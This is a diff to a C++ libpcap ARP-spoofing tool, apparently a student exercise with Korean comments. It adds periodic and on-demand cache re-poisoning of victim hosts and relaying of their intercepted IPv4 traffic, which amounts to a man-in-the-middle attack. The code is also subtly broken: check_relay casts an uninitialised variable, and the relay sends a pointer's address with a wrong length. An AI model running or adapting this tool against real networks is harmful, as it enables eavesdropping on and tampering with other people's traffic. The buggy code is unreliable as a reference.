@@ -1,14 +1,20 @@
 #include "headers.h"
 
+typedef struct PacketInfo
+{
+    Mac sender_mac, target_mac;
+    Ip sender_Ip, target_Ip;
+} Info;
+
 void usage();
-void check_mac(pcap_t* handle, Ip ip, Mac mac);
+void check_mac(pcap_t *handle, Ip ip, Mac mac);
 void get_mydevice(char *dev, Mac *mymac, Ip *myip);
 void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle);
-void infect(pcap_t* handle);
-void infect_2(pcap_t* habdle);
-int check_recover(const u_char* packet);
-int check_relay(const u_char* packet);
-Mac get_mac(pcap_t* handle, Ip sender_ip);
+void infect(pcap_t *handle);
+void infect_2(pcap_t *habdle);
+int check_recover(EthHdr *Ethpacket, Info info);
+int check_relay(EthHdr *Ethpacket, Info info);
+Mac get_mac(pcap_t *handle, Ip sender_ip);
 
 #pragma pack(push, 1)
 struct EthArpPacket final
@@ -16,13 +22,14 @@ struct EthArpPacket final
     EthHdr eth_;
     ArpHdr arp_;
 };
+
+struct EthIpPacket final
+{
+    EthHdr eth_;
+    IPv4_hdr ip_;
+};
 #pragma pack(pop)
 
-typedef struct PacketInfo
-{
-    Mac sender_mac, target_mac;
-    Ip sender_Ip, target_Ip;
-}Info;
 
 
 EthArpPacket packet;
@@ -61,7 +68,7 @@ int main(int argc, char *argv[])
     Mac sender_mac, target_mac;
 
     int count = (argc - 2) / 2;
-    
+
     for (int i = 1; i < count + 1; i++)
     {
         sender_Ip = Ip(std::string(argv[2 * i]));
@@ -76,7 +83,9 @@ int main(int argc, char *argv[])
         info_list.push_back(info);
     }
     std::thread t1(infect, handle);
+    std::thread t2(infect_2, handle);
     t1.join();
+    t2.join();
     pcap_close(handle);
 }
 
@@ -139,7 +148,7 @@ void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option
     }
 }
 
-void check_mac(pcap_t* handle, Ip ip, Mac mac)
+void check_mac(pcap_t *handle, Ip ip, Mac mac)
 {
     if (infomap.find(ip) == infomap.end())
     {
@@ -153,59 +162,91 @@ void check_mac(pcap_t* handle, Ip ip, Mac mac)
     }
 }
 
-void infect(pcap_t* handle)
+void infect(pcap_t *handle)
 {
-    while(thread)
+    while (thread)
     {
         for (auto iter : info_list)
         {
-            printf("공격 하는중입니당 :)\n");
+            printf("20초 주기로 공격 하는중입니당 :)\n");
             send_arp_packet(iter.sender_mac, attacker_mac, 2, attacker_mac, iter.target_Ip, iter.sender_mac, iter.sender_Ip, handle);
         }
-        sleep(3);
+        sleep(20);
     }
 }
 
-void infect_2(pcap_t* handle)
+void infect_2(pcap_t *handle)
 {
-    struct pcap_pkthdr* header;
-	const u_char* replyPacket;
-	while(thread){
+    struct pcap_pkthdr *header;
+    const u_char *replyPacket;
+    while (thread)
+    {
 
-		int res = pcap_next_ex(handle, &header, &replyPacket);
-		if (res == 0) continue;
-		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-			break;
-		}
-		
-        //recover가 필요하면 재감영 시켜주자
-        if(check_recover(replyPacket))
+        int res = pcap_next_ex(handle, &header, &replyPacket);
+        if (res == 0)
+            continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
         {
-
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+            break;
         }
+        EthHdr *Ethpacket = (EthHdr *)replyPacket;
 
-        //relay 필요하면 보내기
-        if(check_relay(replyPacket))
+        for (auto iter : info_list)
         {
+            //recover가 필요하면(반환형이 1이면) 재감영 시켜주자
+            if (check_recover(Ethpacket, iter))
+            {
+                printf("비주기 공격 실행 :)\n");
+                send_arp_packet(iter.sender_mac, attacker_mac, 2, attacker_mac, iter.target_Ip, iter.sender_mac, iter.sender_Ip, handle);
+            }
 
+            //relay 필요하면 보내기
+            if (check_relay(Ethpacket, iter))
+            {
+                printf("relay 실행:) \n");
+                EthIpPacket *packet =  (EthIpPacket*) Ethpacket;
+                packet->eth_.smac_ = attacker_mac;
+                packet->eth_.dmac_ = iter.target_mac;
+                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(header->len));
+                if (res != 0)
+                {
+                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                }
+            }
         }
-		
+    }
 }
 
-int check_recover(const u_char* packet)
+int check_recover(EthHdr *Ethpacket, Info info)
 {
-      EthArpPacket packet = *((EthArpPacket *)received_packet);
-  if (packet.eth_.type() != EthHdr::Arp) return false;
-  if (packet.arp_.op_ != htons(ArpHdr::Request)) return false;
-  if (packet.eth_.dmac() == sender_mac || packet.eth_.dmac() == target_mac ||
-      packet.eth_.dmac() == Mac("ff:ff:ff:ff:ff:ff")) {
-    return true;
-  }
-  return false;
+    if (Ethpacket->type() != EthHdr::Arp)
+        return 0;
+
+    EthArpPacket *packet = (EthArpPacket *)Ethpacket;
+    if (packet->arp_.op() != ArpHdr::Request)
+        return 0;
+    
+    if (packet->arp_.tip() == info.target_Ip)
+        return 1;
+
+    else
+        return 0;
 }
 
-int check_relay(const u_char* packet);
+int check_relay(EthHdr *Ethpacket, Info info)
+{
+    if(Ethpacket->type() != EthHdr::Ip4)
+        return 0;
+    
+    EthIpPacket *packet =  (EthIpPacket*) packet;
+    if((packet->eth_.smac() == info.sender_mac) && packet->ip_.dip != attacker_Ip)
+        return 1;
+
+    else
+        return 0;
+
+}
 
 Mac get_mac(pcap_t *handle, Ip Ip)
 {
